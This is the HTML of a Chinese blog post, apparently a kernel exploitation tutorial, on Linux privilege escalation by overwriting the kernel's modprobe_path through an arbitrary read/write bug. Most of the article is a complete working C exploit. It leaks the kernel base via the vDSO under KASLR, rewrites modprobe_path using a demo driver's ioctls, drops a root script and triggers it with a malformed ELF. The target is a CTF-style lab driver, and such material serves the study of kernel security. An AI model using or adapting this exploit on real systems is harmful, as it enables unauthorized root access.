@@ -1,0 +1,484 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html
+  class="not-ready lg:text-base"
+  style="--bg: #faf8f1"
+  lang="en-us"
+>
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+
+  
+  <title>linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三) - povcfe&#39;s site</title>
+
+  
+  <meta name="theme-color" />
+
+  
+  
+  
+  
+  <meta name="description" content="发表于看雪论坛
+hijack_modprobe_path篇 原理同hijack_prctl, 当用户执行错误格式的elf文件时内核调用call_usermodehelper(char *modprobe_path &hellip;)
+修改modprobe后，即可实现root权限任意命令执行
+攻击流程
+(内核任意读写漏洞)内核修改全局变量 modprobe_path为目标指令 写入错误格式elf文件，并手动执行，触发 一. 利用步骤 1. 定位modprobe_path(开启kaslr) 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址
+获得当前调试阶段modprobe_path与内核基地址固定偏移
+modprobe_path_addr = 内核基地址&#43;固定偏移
+2. 修改modprobe_path 为任意指令 二. 驱动代码(见cred) 三. exp #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;sys/auxv.h&gt; #include &lt;sys/prctl.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 size_t modprobe_path = 0xe3cba0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL." />
+  <meta name="author" content="povcfe" />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="https://povcfe.github.io/main.min.css" />
+
+  
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/theme.png" />
+
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/avatar.jpg" />
+  
+  
+
+  
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/twitter.svg" />
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/github.svg" />
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/rss.svg" />
+  
+  
+
+  
+  
+  <script
+    defer
+    src="https://povcfe.github.io/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
+  
+
+  
+  
+  
+
+  
+  <link rel="icon" href="https://povcfe.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://povcfe.github.io/apple-touch-icon.png" />
+
+  
+  <meta name="generator" content="Hugo 0.111.3">
+
+  
+  
+  
+  
+  
+  <meta itemprop="name" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三)">
+<meta itemprop="description" content="发表于看雪论坛
+hijack_modprobe_path篇 原理同hijack_prctl, 当用户执行错误格式的elf文件时内核调用call_usermodehelper(char *modprobe_path &hellip;)
+修改modprobe后，即可实现root权限任意命令执行
+攻击流程
+(内核任意读写漏洞)内核修改全局变量 modprobe_path为目标指令 写入错误格式elf文件，并手动执行，触发 一. 利用步骤 1. 定位modprobe_path(开启kaslr) 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址
+获得当前调试阶段modprobe_path与内核基地址固定偏移
+modprobe_path_addr = 内核基地址&#43;固定偏移
+2. 修改modprobe_path 为任意指令 二. 驱动代码(见cred) 三. exp #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;sys/auxv.h&gt; #include &lt;sys/prctl.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 size_t modprobe_path = 0xe3cba0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL."><meta itemprop="datePublished" content="2020-02-02T00:00:00-04:00" />
+<meta itemprop="dateModified" content="2020-02-02T00:00:00-04:00" />
+<meta itemprop="wordCount" content="213">
+<meta itemprop="keywords" content="" />
+  
+  <meta property="og:title" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三)" />
+<meta property="og:description" content="发表于看雪论坛
+hijack_modprobe_path篇 原理同hijack_prctl, 当用户执行错误格式的elf文件时内核调用call_usermodehelper(char *modprobe_path &hellip;)
+修改modprobe后，即可实现root权限任意命令执行
+攻击流程
+(内核任意读写漏洞)内核修改全局变量 modprobe_path为目标指令 写入错误格式elf文件，并手动执行，触发 一. 利用步骤 1. 定位modprobe_path(开启kaslr) 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址
+获得当前调试阶段modprobe_path与内核基地址固定偏移
+modprobe_path_addr = 内核基地址&#43;固定偏移
+2. 修改modprobe_path 为任意指令 二. 驱动代码(见cred) 三. exp #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;sys/auxv.h&gt; #include &lt;sys/prctl.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 size_t modprobe_path = 0xe3cba0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://povcfe.github.io/post/kernel_rw3/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2020-02-02T00:00:00-04:00" />
+<meta property="article:modified_time" content="2020-02-02T00:00:00-04:00" />
+
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三)"/>
+<meta name="twitter:description" content="发表于看雪论坛
+hijack_modprobe_path篇 原理同hijack_prctl, 当用户执行错误格式的elf文件时内核调用call_usermodehelper(char *modprobe_path &hellip;)
+修改modprobe后，即可实现root权限任意命令执行
+攻击流程
+(内核任意读写漏洞)内核修改全局变量 modprobe_path为目标指令 写入错误格式elf文件，并手动执行，触发 一. 利用步骤 1. 定位modprobe_path(开启kaslr) 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址
+获得当前调试阶段modprobe_path与内核基地址固定偏移
+modprobe_path_addr = 内核基地址&#43;固定偏移
+2. 修改modprobe_path 为任意指令 二. 驱动代码(见cred) 三. exp #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;sys/auxv.h&gt; #include &lt;sys/prctl.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 size_t modprobe_path = 0xe3cba0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL."/>
+
+  
+  
+  
+  <link rel="canonical" href="https://povcfe.github.io/post/kernel_rw3/" />
+  
+  
+</head>
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
+  <div class="relative z-50 mr-auto flex items-center">
+    <a
+      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
+      href="https://povcfe.github.io/"
+      >povcfe&#39;s site</a
+    >
+    <div
+      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
+      role="button"
+      aria-label="Dark"
+    ></div>
+  </div>
+
+  <div
+    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+    role="button"
+    aria-label="Menu"
+  ></div>
+
+  
+
+  <script>
+    
+    const htmlClass = document.documentElement.classList;
+    setTimeout(() => {
+      htmlClass.remove('not-ready');
+    }, 10);
+
+    
+    const btnMenu = document.querySelector('.btn-menu');
+    btnMenu.addEventListener('click', () => {
+      htmlClass.toggle('open');
+    });
+
+    
+    const metaTheme = document.querySelector('meta[name="theme-color"]');
+    const lightBg = '#faf8f1'.replace(/"/g, '');
+    const setDark = (isDark) => {
+      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
+      htmlClass[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark);
+    };
+
+    
+    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+    if (htmlClass.contains('dark')) {
+      setDark(true);
+    } else {
+      const darkVal = localStorage.getItem('dark');
+      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
+    }
+
+    
+    darkScheme.addEventListener('change', (event) => {
+      setDark(event.matches);
+    });
+
+    
+    const btnDark = document.querySelector('.btn-dark');
+    btnDark.addEventListener('click', () => {
+      setDark(localStorage.getItem('dark') !== 'true');
+    });
+  </script>
+
+  <div
+    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
+  >
+    
+    
+
+    
+    <nav
+      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
+    >
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./twitter.svg)"
+        href="https://twitter.com/povcfe"
+        target="_blank"
+        rel="me"
+      >
+        twitter
+      </a>
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./github.svg)"
+        href="https://github.com/povcfe"
+        target="_blank"
+        rel="me"
+      >
+        github
+      </a>
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./rss.svg)"
+        href="https://povcfe.github.io/index.xml"
+        target="_blank"
+        rel="alternate"
+      >
+        rss
+      </a>
+      
+    </nav>
+    
+  </div>
+</header>
+
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
+    >
+      
+
+<article>
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三)</h1>
+
+    
+    <div class="text-sm antialiased opacity-60">
+      
+      <time>Feb 2, 2020</time>
+      
+      
+      
+      
+    </div>
+    
+  </header>
+
+  <section><p><a href="https://bbs.pediy.com/user-839858.htm">发表于看雪论坛</a></p>
+<h2 id="hijack_modprobe_path篇">hijack_modprobe_path篇</h2>
+<ul>
+<li>
+<p>原理同hijack_prctl, 当用户执行错误格式的elf文件时内核调用call_usermodehelper(char *modprobe_path &hellip;)</p>
+</li>
+<li>
+<p>修改modprobe后，即可实现root权限任意命令执行</p>
+</li>
+<li>
+<p>攻击流程</p>
+<ul>
+<li>(内核任意读写漏洞)内核修改全局变量 modprobe_path为目标指令</li>
+<li>写入错误格式elf文件，并手动执行，触发</li>
+</ul>
+</li>
+</ul>
+<h3 id="一-利用步骤">一. 利用步骤</h3>
+<h4 id="1-定位modprobe_path开启kaslr">1. 定位modprobe_path(开启kaslr)</h4>
+<ul>
+<li>
+<p>同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址</p>
+</li>
+<li>
+<p>获得当前调试阶段modprobe_path与内核基地址固定偏移</p>
+</li>
+<li>
+<p>modprobe_path_addr = 内核基地址+固定偏移</p>
+</li>
+</ul>
+<h4 id="2-修改modprobe_path-为任意指令">2. 修改modprobe_path 为任意指令</h4>
+<h3 id="二-驱动代码见cred">二. 驱动代码(见cred)</h3>
+<h3 id="三-exp">三. exp</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/auxv.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/prctl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CHANGE_POINT 0x100000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define RW_READ 0x100001
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define RW_WRITE 0x100002
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> modprobe_path <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe3cba0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> vmlinux_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> vunl
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>point;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> size;
+</span></span><span style="display:flex;"><span>} VUNL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">leak_data</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>res <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    VUNL.size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">size_t</span> addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff80000000</span>; addr <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xffffffffffffffff</span>; addr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1000</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        VUNL.point <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ioctl</span>(fd, CHANGE_POINT, <span style="color:#f92672">&amp;</span>VUNL); <span style="color:#75715e">//change the point
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">ioctl</span>(fd, RW_READ, buf);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;gettimeofday&#34;</span>, buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2b5</span>))
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] the addr of VDSO is: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, addr);
+</span></span><span style="display:flex;"><span>            vmlinux_base <span style="color:#f92672">=</span> addr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffff000000</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] the addr of vmlinux base is: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, vmlinux_base);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[-] not found, try again!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/rw_any_dev&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">leak_data</span>(fd, buf);
+</span></span><span style="display:flex;"><span>    modprobe_path <span style="color:#f92672">+=</span> vmlinux_base;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] the addr of modprobe_path is: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, modprobe_path);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    VUNL.size <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(argv[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    VUNL.point <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)modprobe_path;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, CHANGE_POINT, <span style="color:#f92672">&amp;</span>VUNL);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, RW_WRITE, argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo -ne &#39;#!/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">chmod 777 /flag&#39; &gt; /su.sh&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod +x /su.sh&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo -ne &#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff&#39; &gt; /dummy&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod +x /dummy&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/dummy&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></section>
+
+  
+  
+
+  
+  
+  
+  
+  <nav class="mt-24 flex rounded-lg bg-black/[3%] text-lg dark:bg-white/[8%]">
+    
+    <a
+      class="flex w-1/2 items-center rounded-l-md p-6 pr-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
+      href="https://povcfe.github.io/post/kernel_boot/"
+      ><span class="mr-1.5">←</span><span>linux内核(5.6.6)---内核引导</span></a
+    >
+    
+    
+    <a
+      class="ml-auto flex w-1/2 items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
+      href="https://povcfe.github.io/post/kernel_rw2/"
+      ><span>linux 内核提权总结(demo&#43;exp分析) -- 任意读写(二)</span><span class="ml-1.5">→</span></a
+    >
+    
+  </nav>
+  
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+</article>
+
+
+    </main>
+
+    <footer
+  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
+>
+  <div class="mr-auto">
+    &copy; 2024
+    <a class="link" href="https://povcfe.github.io/">povcfe&#39;s site</a>
+  </div>
+  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
+    >Powered by Hugo️️</a
+  >️
+  <a
+    class="link"
+    href="https://github.com/nanxiaobei/hugo-paper"
+    rel="noopener"
+    target="_blank"
+    >✎ Paper</a
+  >
+</footer>
+
+  </body>
+</html>
